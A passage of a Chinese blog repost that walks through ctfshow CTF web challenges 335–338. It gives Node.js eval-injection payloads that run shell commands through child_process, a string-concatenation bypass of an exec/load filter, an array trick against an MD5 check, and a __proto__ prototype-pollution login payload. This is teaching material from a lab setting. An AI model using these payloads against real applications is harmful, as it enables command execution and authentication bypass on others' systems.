+<h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a><strong>第一种方法</strong></h5><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GGcwHiawICJbtvm8jwxU4oQHR0kF0rJfClM8ic5T4D4xPLYnsNRddnE9Q/640?wx_fmt=png" alt=""></p>
+<p>然后cat fl00g.txt即可</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GdLUc1y1UkMUMv1icRMDbbRanB5maD3kNhp0EaZfd7xkicHQ1AvGHT3IA/640?wx_fmt=png" alt=""></p>
+<p>还有就是上面那个payload了<br>总：</p>
+<blockquote>
+<p>first<br>require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()<br>require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()<br>second<br>require(“child_process”).execSync(‘ls’)<br>require(“child_process”).execSync(‘cat fl00g.txt’)</p>
+</blockquote>
+<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a><strong>第二种方法</strong></h5><p>参考群里Y4师傅的博客</p>
+<blockquote>
+<p>global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)</p>
+<h4 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h4><p>?eval=require(“child_process”).spawnSync(‘ls’).stdout.toString()<br>?eval=require( ‘child_process’ ).spawnSync( ‘cat’, [ ‘fl001g.txt’ ] ).stdout.toString()</p>
+</blockquote>
+<p>直接使用这个就可以，但是，我用另一个方法时，发现了过滤。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GKwvHwfdSFZ0UxBbyVOXDWaicST8qEjFjlCvSmJJhxYBvjmEOlibiaFia0Q/640?wx_fmt=png" alt=""></p>
+<p>这里发现使用335的另外两种方法都不行，然后看Y4师傅的姿势，<br>这里是由好多方法，整理了一下，为方便理解，由易到难来记录。</p>
+<h5 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h5><p>读取文件，通过全局变量读取当前目录位置<br>__filename<br>然后查找资料看看还有什么其他的全局变量<br>__dirname 表示当前执行脚本所在的目录。<br>1、global: nodejs中的顶层对象，相当于前端js的window<br>2、__dirname: 超全局变量/魔术变量，用于获取当前执行文件的所在目录<br>3、__filename: 超全局变量/魔术变量，用于获取当前执行文件的绝对路径<br>查看当前文件的绝对路径。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GVr7uia9YTcImicqFRnDpMTYEDklU2FsEltsjTKvpFRfkVnxbHtQHfmqA/640?wx_fmt=png" alt=""></p>
+<p>然后可以看到文件名，然后读取当前目录下的内容。</p>
+<p>使用fs.readdirSync()</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Gm2muz6keFUWdB1hI6Ksxnjd2mmdE3WJ5T3CBEjekZTcYDQoiafYAySw/640?wx_fmt=png" alt=""></p>
+<p>发现了fl001g.txt<br>直接读取该文件</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GocSz6cpqxNZJqB51ebSQj0yicAAYfGJJ1LFtSYdEoD2wZIa1fljmJcA/640?wx_fmt=png" alt=""></p>
+<h5 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h5><p>然后根据大佬思路，读取该文件的源码，看看是过滤了什么内容。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G0Jb481icGicG6H720aFTQDsI2fWckqpfUQydAOibglTiafRbZD1lvmpvDw/640?wx_fmt=png" alt=""></p>
+<p>payload为</p>
+<pre><code>?require(&quot;fs&quot;).readFileSync(&apos;/app/routes/index.js&apos;,&apos;utf-8&apos;)</code></pre><p>源码：</p>
+<pre><code>var express = require(&apos;express&apos;); </code></pre><p>可以看出是在 if(typeof(evalstring)==’string’ &amp;&amp; evalstring.search(/exec|load/i)&gt;0){<br>这里进行过滤，过滤了exec和load，进行编码绕过</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GGIUMsbQ2Q2L0AicmmLQuuicZx8gic53udG45I9xYru3uM0a4e4blTymbQ/640?wx_fmt=png" alt=""></p>
+<p>在本地测试后发现是可以进行拼接的。<br>在浏览器中，+会被解析成空格，所以要先将+进行编码。</p>
+<pre><code>require(&quot;child_process&quot;)[&apos;exe&apos;%2B&apos;cSync&apos;](&apos;ls&apos;)</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G5IUiczM6MAyicYQOPrrehvh87qbyyicAOlUHwRX6obOicEYoKoNk1NibX3A/640?wx_fmt=png" alt=""></p>
+<h5 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a><strong>第三种</strong></h5><p>直接使用</p>
+<blockquote>
+<p>require( “child_process” ).spawnSync( ‘ls’, [ ‘.’ ] ).stdout.toString()<br>require( “child_process” ).spawnSync( ‘cat’, [ ‘fl00g.txt’ ] ).stdout.toString()</p>
+</blockquote>
+<p>这个方法正好不在过滤范围内。可以直接使用。</p>
+<h4 id="web337"><a href="#web337" class="headerlink" title="web337"></a><strong>web337</strong></h4><pre><code>var express = require(&apos;express&apos;);</code></pre><p>这里使用数组绕过MD5比较，还有a和b的长度比较。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GzTNdSvETsUrLpvqxo5NPUrXOqicv0qCQw6Ne9KN9IpCsPq8pFQRRfuA/640?wx_fmt=png" alt=""></p>
+<p>最后输出都是[object Object]flag{xxx}<br>所以可以使用数组来绕过。<br>paylaod：a[x]=1&amp;b[x]=2</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GToI5Py39tKtSRcC9xjOXDcd8IITMNYufkuCRSWPQ4tS5hoB9SJZDZw/640?wx_fmt=png" alt=""></p>
+<h4 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338(原型链污染)"></a><strong>web338(原型链污染)</strong></h4><p>这个是一道入门题目，源码都给了，在源码中查看，找到了login.js，发现了getflag的关键处。</p>
+<pre><code>/* GET home page.  */</code></pre><p>utils.copy(user,req.body);利用这里可实现原型链污染，使得secret继承Object.prototype</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G4GLXl90bByLMWkhuKaiajTRwJUntVEs8jdyp1Qd61jPkiaFC4z8BFe8w/640?wx_fmt=png" alt=""></p>
+<p>payload:{“username”:”admin”,”password”:”pass”,”__proto__“:{“ctfshow”:”36dboy”}}<br>secret继承了这里的ctfshow的值，所以就刚好使得if语句为true，登录成功。</p>
+<p>总结</p>
+<p>因为是从零基础开始学的NodeJS，所以零碎的基础知识有点多。</p>
+<p>参考链接</p>
+<p><a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a><br><a href="https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br><a href="https://looaon.com/index.php/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1110.html" target="_blank" rel="noopener">https://looaon.com/index.php/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1110.html</a><br><a href="https://xz.aliyun.com/t/7182" target="_blank" rel="noopener">https://xz.aliyun.com/t/7182</a><br><a href="https://www.kitsch.live/2021/03/14/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://www.kitsch.live/2021/03/14/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br><a href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br><a href="http://purplet.top/2020/07/14/javascript%e5%8e%9f%e5%9e%8b%e3%80%81%e5%8e%9f%e5%9e%8b%e9%93%be%e5%8f%8a%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93/" target="_blank" rel="noopener">http://purplet.top/2020/07/14/javascript%e5%8e%9f%e5%9e%8b%e3%80%81%e5%8e%9f%e5%9e%8b%e9%93%be%e5%8f%8a%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93/</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance\_and\_the\_prototype\_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance\_and\_the\_prototype\_chain</a></p>
+<p>（点击“阅读原文”查看链接）</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png" alt="" title="虚线阴影分割线">  </p>
+<p>- End -  </p>
+<p>精彩推荐</p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649743975&idx=1&sn=d733fe5c80ebe78a1f5fb19007bd4974&chksm=888cd208bffb5b1e1cbc29d8fe9dad73ab0ae293852c175dcf6842e9942dd0f8dbde2ece3bc3&scene=21#wechat_redirect" target="_blank" rel="noopener">【技术分享】CVE-2021-26295 Apache OFBiz 反序列化分析</a>  </p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649743918&idx=1&sn=11c50cc8ad4fcc12d631e21ef41515c4&chksm=888cd241bffb5b57ed8e9141abfcaf0e5b2b63abe9e107b0d8dee00c6c2e0e5b9c9a22532ab9&scene=21#wechat_redirect" target="_blank" rel="noopener">【技术分享】探探JDBC反序列化漏洞</a>  </p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649743865&idx=1&sn=c8e8c1c8546689aabdb16184240aac34&chksm=888cd196bffb5880459068f43c1926adb1d7b66defd2c110c952e5802aa698261aea3d316826&scene=21#wechat_redirect" target="_blank" rel="noopener">联合国中招邮件诈骗，行骗者获利270万却称生活所迫？</a>  </p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649743854&idx=1&sn=9af3da306fd296a10b6906364790c462&chksm=888cd181bffb589707e38bbe714e1a022628457ed85976c17f46f4e323e189057afea73c8238&scene=21#wechat_redirect" target="_blank" rel="noopener">新书推荐 | 《Kali Linux2：网络渗透测试实践指南（第2版）》</a></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif" alt="">  </p>
+<hr>
+<p><strong>戳“阅读原文”查看更多内容</strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/fetched/" rel="tag"># fetched</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/26/qiwihui-pocket_readings-1087/" rel="prev" title="
+
+
+【技术分享】BlackHat：HTTP 请求走私的新变体、新防御 ">
+      <i class="fa fa-chevron-left"></i> 
+
+
+【技术分享】BlackHat：HTTP 请求走私的新变体、新防御 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/28/qiwihui-pocket_readings-1090/" rel="next" title="互联网时代的创作（上）：我们注定不会再有伟大的作品了吗？ - 少数派">
+      互联网时代的创作（上）：我们注定不会再有伟大的作品了吗？ - 少数派 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Comments"><span class="nav-number">1.</span> <span class="nav-text">Comments</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#【技术分享】NodeJS从零开始到原型链污染-by-安全客"><span class="nav-number"></span> <span class="nav-text">【技术分享】NodeJS从零开始到原型链污染 by 安全客</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读取文件操作"><span class="nav-number">1.</span> <span class="nav-text">读取文件操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#同步和异步"><span class="nav-number">3.</span> <span class="nav-text">同步和异步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">4.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量"><span class="nav-number">5.</span> <span class="nav-text">全局变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-2"><span class="nav-number">6.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP服务"><span class="nav-number">7.</span> <span class="nav-text">HTTP服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#child-process-创建子进程"><span class="nav-number">8.</span> <span class="nav-text">child_process(创建子进程)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原型和原型链"><span class="nav-number">9.</span> <span class="nav-text">原型和原型链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaScript中的对象"><span class="nav-number">9.1.</span> <span class="nav-text">JavaScript中的对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原型的定义和继承"><span class="nav-number">9.2.</span> <span class="nav-text">原型的定义和继承</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原型链定义及如何污染"><span class="nav-number">9.3.</span> <span class="nav-text">原型链定义及如何污染</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NodeJS简单类型的题目以及常见绕过"><span class="nav-number">10.</span> <span class="nav-text">NodeJS简单类型的题目以及常见绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web334"><span class="nav-number">10.1.</span> <span class="nav-text">web334</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web335"><span class="nav-number">10.2.</span> <span class="nav-text">web335</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#第一种方法"><span class="nav-number">10.2.1.</span> <span class="nav-text">第一种方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第二种方法"><span class="nav-number">10.2.2.</span> <span class="nav-text">第二种方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web336"><span class="nav-number">10.3.</span> <span class="nav-text">web336</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#第一种"><span class="nav-number">10.3.1.</span> <span class="nav-text">第一种</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第二种"><span class="nav-number">10.3.2.</span> <span class="nav-text">第二种</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第三种"><span class="nav-number">10.3.3.</span> <span class="nav-text">第三种</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web337"><span class="nav-number">10.4.</span> <span class="nav-text">web337</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web338-原型链污染"><span class="nav-number">10.5.</span> <span class="nav-text">web338(原型链污染)</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">qiwihui</p>
+  <div class="site-description" itemprop="description">个人阅读清单记录博客，并不代表个人观点。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">qiwihui</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
